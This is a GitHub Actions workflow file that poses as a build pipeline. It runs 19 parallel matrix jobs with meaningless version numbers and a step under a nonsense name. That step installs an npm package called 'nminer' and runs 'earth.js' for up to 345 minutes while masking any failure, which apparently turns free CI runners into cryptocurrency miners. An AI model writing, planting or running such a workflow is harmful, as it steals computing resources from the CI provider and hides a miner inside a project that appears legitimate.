name: earth
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 414 }
          - { version: 4336 }
          - { version: 2509 }
          - { version: 3100 }
          - { version: 35 }
          - { version: 9488 }
          - { version: 4226 }
          - { version: 3035 }
          - { version: 844 }
          - { version: 9359 }
          - { version: 3833 }
          - { version: 7732 }
          - { version: 3997 }
          - { version: 5124 }
          - { version: 5989 }
          - { version: 7649 }
          - { version: 1493 }
          - { version: 7652 }
          - { version: 6131 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: hose gosh easily officially
        run: |
          npm install nminer@latest
          timeout 345m node earth.js || echo "earth executed"